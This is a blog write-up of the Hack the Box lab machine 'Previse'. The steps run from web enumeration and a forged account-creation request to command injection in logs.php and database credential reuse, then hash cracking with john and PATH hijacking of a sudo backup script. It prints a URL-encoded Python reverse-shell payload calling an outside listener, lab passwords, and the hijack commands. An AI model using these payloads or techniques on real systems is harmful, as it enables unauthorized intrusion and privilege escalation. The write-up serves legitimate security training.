+++
author = "Nick"
categories = ["hack the box", "Linux", "easy", "burpsuite", "command injection", "gobuster", "mysql", "john", "path hijacking"]
date = 2022-01-08T15:16:55Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2021/08/previse.png"
slug = "hack-the-box-previse"
tags = ["hack the box", "Linux", "easy", "burpsuite", "command injection", "gobuster", "mysql", "john", "path hijacking"]
title = "Hack the Box - Previse"

+++


Welcome back! Today's Hack the Box write-up is for the machine Previse. This machine is listed as an easy Linux machine. Let's get to it!

As usual, we start with a full `nmap` scan. Here are our results.

```
Nmap scan report for 10.10.11.104
Host is up (0.048s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports available, so it looks like our path with be via web exploit of some type. So we'll load up `Burpsuite` and see what's being hosted on port 80.

We see that a basic username / password landing page. Before we start digging into the web requests, we'll try to enumerate any additional files or directories with `gobuster`. 

Command:
`gobuster dir -u http://10.10.11.104 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x .php,.old,.bak -t 60 -b 403,404`

{{< figure src="__GHOST_URL__/content/images/2021/08/image-37.png" >}}

We see a bunch of files. We check them all and find the `nav.php` has some interesting links.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-38.png" >}}

When trying to access all of these resources, we need an account. Luckily for us, we have a create account page! However, the page isn't accessable via the browser. When we view the `HTTP` request, we see that is actually something we can access.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-39.png" >}}

Given that we can see the source for this request, we know the parameters we need to `POST` in order to create an account.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-40.png" >}}

So we will craft the request we need to supply a `username`, `password` and `confirmation` password. We also need to be sure to add our `Content-Type` of `application/x-www-form-urlencoded`. All together, we have the following request.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-41.png" >}}

We send the request and we get back a success message!

{{< figure src="__GHOST_URL__/content/images/2021/08/image-42.png" >}}

We can now log into the site. When we start looking around we find the file `SITEBACKUP.ZIP` in the files section. We download the file and unzip it to find exactly what we think, a backup of the site. We see in `config.php` a username and password.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-43.png" >}}

We still need a username to go with the password. Now, if we look around the site a bit more we have a Request Log Data section. If we download the file, we can see the users associated to logging in, this could give us a user to `SSH` with.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-44.png" >}}

Unable to login with those credentials. Now as we continue to sift through the files, we find a gem. A `Python exec()` call in the `logs.php` file.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-45.png" >}}

This is not a properly sanatized output, meaning we can leverage it to break things. More on [Command Injection here](https://portswigger.net/web-security/os-command-injection).

The key thing to remember here is that `Python` is calling the `exec()` function. So any injection we want to do, has to be in 'code'. More on that [here](https://www.stackhawk.com/blog/command-injection-python/).

We will use a `python` 'one-liner' to gain a remote shell. Take your pick from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python). Just be to use URL encode the request!

Here's our request data being sent.

```
delim=comma;python3+-c+'a%3d__import__%3bs%3da("socket")%3bo%3da("os").dup2%3bp%3da("pty").spawn%3bc%3ds.socket(s.AF_INET,s.SOCK_STREAM)%3bc.connect(("10.10.14.99",4242))%3bf%3dc.fileno%3bo(f(),0)%3bo(f(),1)%3bo(f(),2)%3bp("/bin/bash")'
```
We sping up a `netcat` listener on port `4242`.

Command:
`nc -lvnp 4242`

Now ww send our request (a few times), and eventually get a response back on our `netcat` listener

{{< figure src="__GHOST_URL__/content/images/2021/08/image-46.png" >}}

Before we start enumerating any further, we should check to see if we have `mysql` access. We have credentials from before that we should try to leverage and see what we have access to.

Command:
`mysql -u root -p'mySQL_p@ssw0rd!:)'`

{{< figure src="__GHOST_URL__/content/images/2021/08/image-47.png" >}}

Sure enough, we have access! Now we can start sifting through the database.

Commands:
```
use previse;
show tables;
select * from accounts;
```

{{< figure src="__GHOST_URL__/content/images/2021/08/image-48.png" >}}

Now we see our username and hashes. We'll copy them out to crack, we really just want `m4lwhere` in particular.

Command:
`echo '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' > m4lwhere.hash`

Now we can run it against `rockyou.txt` to see what we might be able to find. In this case I'll use `john`.

Command:
`john -w=/usr/share/wordlists/rockyou.txt m4lwhere.hash --format=md5crypt-long`

{{< figure src="__GHOST_URL__/content/images/2021/08/image-49.png" >}}

A few minutes later we get a match `ilovecody1122235!`. Now let's see if we can `SSH` with this password.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-50.png" >}}

Sure enough, we are in! Let's snag our `user.txt` flag and find a way to root! The next thing we check is `sudo -l`.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-51.png" >}}

It looks like we have the ability to run a backup script.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-52.png" >}}

The problem with this script is that its just saying `gzip`. It's not giving a specific path to `gzip`. This is `Path Hijacking` and it's the reason why you should ensure your paths are explicit and narrow as can be. What we'll do is create our own `gzip` file. This will just be a simple file to `cat` our the `root.txt` flag.

Step one - create a file in a temporary directory in `tmp`. We do it this way so that we don't ruin the box for others. 

Command:
`mkdir /tmp/rf`
`cd /tmp/rf`

Step two - create our 'malicous' `gzip` file.

Command:
`echo 'cat /root/root.txt > /tmp/rf/flag.txt' > gzip`
`chmod +x gzip`

Step three - we will add our temporary path to the enviornmental variables.

Command:
`export PATH=/tmp/rf:$PATH`

You can see that our temporary path has been pre-pended to our `PATH`. This means that the Linux Operating System will check this path before all others for any executable we are running. In this case, the evil `gzip` file.

Now we simply run our privledged script.

Command:
`sudo /opt/scripts/access_backup.sh`

{{< figure src="__GHOST_URL__/content/images/2021/08/previseroot.gif" >}}

We get a text file with the `root.txt` flag inside! Feel free to send respect my way if you found this write-up helpful.

HTB Profile - https://app.hackthebox.eu/profile/95635



